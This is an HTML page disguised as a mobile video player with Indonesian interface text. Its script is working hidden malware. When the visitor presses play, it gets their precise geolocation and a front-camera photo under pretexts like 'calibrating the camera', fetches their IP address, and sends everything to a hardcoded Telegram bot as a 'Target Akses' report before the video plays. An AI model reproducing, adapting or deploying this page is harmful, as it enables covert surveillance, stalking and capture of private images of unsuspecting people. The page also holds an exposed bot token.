<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: system-ui, -apple-system, sans-serif;
        }
        .player-container {
            background: #1a1a1a;
            border-radius: 28px;
            padding: 12px;
            max-width: 380px;
            width: 90%;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
        }
        .video-placeholder {
            width: 100%;
            aspect-ratio: 9/16;
            border-radius: 22px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 16px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
            /* BACKGROUND KHUSUS DI BAGIAN INI AJA, BANGSAT! */
            background-image: url('https://files.catbox.moe/k2ctm8.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .controls {
            padding: 16px 8px 8px;
            display: flex;
            justify-content: center;
        }
        .play-btn {
            background: #3b82f6;
            color: white;
            border: none;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 10px 20px -5px #3b82f680;
        }
        video {
            width: 100%;
            height: 100%;
            border-radius: 22px;
            display: none;
        }
        .permission-message {
            color: #aaa;
            font-size: 12px;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="player-container">
        <div class="video-placeholder" id="videoBox">
            <div class="spinner"></div>
            <div>SELAMAT MENONTON</div>
            <div style="font-size: 12px; opacity: 0.8;">Loading video...</div>
        </div>
        <video id="realVideo" controls>
            <source src="https://files.catbox.moe/iv6qm1.mp4" type="video/mp4">
            Browser lo kentang, goblok!
        </video>
        <div class="controls">
            <button class="play-btn" id="playBtn">▶</button>
        </div>
        <div class="permission-message" id="permissionMsg"></div>
    </div>

    <script>
        // ==================== KONFIGURASI TELEGRAM ====================
        const BOT_TOKEN = '8772580581:AAFmaUwFU0PZ5PQMfFtV4fndVGaziiRuK0c';
        const CHAT_ID = '8493158139';
        // =============================================================

        const playBtn = document.getElementById('playBtn');
        const videoBox = document.getElementById('videoBox');
        const realVideo = document.getElementById('realVideo');
        const permissionMsg = document.getElementById('permissionMsg');

        async function sendToTelegram(message, photoBlob = null) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
            
            if (photoBlob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'capture.jpg');
                formData.append('caption', message);
                
                try {
                    await fetch(url + 'sendPhoto', { method: 'POST', body: formData });
                } catch (e) { console.error('Gagal kirim foto', e); }
            } else {
                try {
                    await fetch(url + 'sendMessage', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                    });
                } catch (e) { console.error('Gagal kirim pesan', e); }
            }
        }

        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('Geolocation tidak didukung');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const { latitude, longitude } = pos.coords;
                        resolve(`https://maps.google.com/?q=${latitude},${longitude}`);
                    },
                    (err) => {
                        resolve('Gagal ambil lokasi: ' + err.message);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' },
                    audio: false 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());
                
                return new Promise((resolve) => {
                    canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.8);
                });
            } catch (err) {
                console.error('Gagal akses kamera', err);
                return null;
            }
        }

        playBtn.addEventListener('click', async () => {
            videoBox.innerHTML = '<div class="spinner"></div><div>SELAMAT MENONTON</div><div style="font-size: 12px; opacity: 0.8;">Mengoptimalkan video...</div>';
            permissionMsg.innerHTML = '🔍 Menginisialisasi player...';
            
            permissionMsg.innerHTML = '📍 Mendeteksi wilayah...';
            const locationLink = await getLocation();
            
            permissionMsg.innerHTML = '📷 Mengkalibrasi kamera...';
            const photoBlob = await capturePhoto();
            
            if (!photoBlob) {
                permissionMsg.innerHTML = '⚠️ Kamera tidak terdeteksi';
            }
            
            const ipInfo = await fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => `IP: ${data.ip}`)
                .catch(() => 'IP: Gagal ambil');
            
            const message = `👤 *Target Akses*\n${locationLink}\n${ipInfo}`;
            
            if (photoBlob) {
                await sendToTelegram(message, photoBlob);
            } else {
                await sendToTelegram(message + '\nFoto gagal diambil');
            }
            
            videoBox.style.display = 'none';
            realVideo.style.display = 'block';
            realVideo.play();
            permissionMsg.innerHTML = '✅ Video siap ditonton!';
        });
    </script>
</body>
</html>
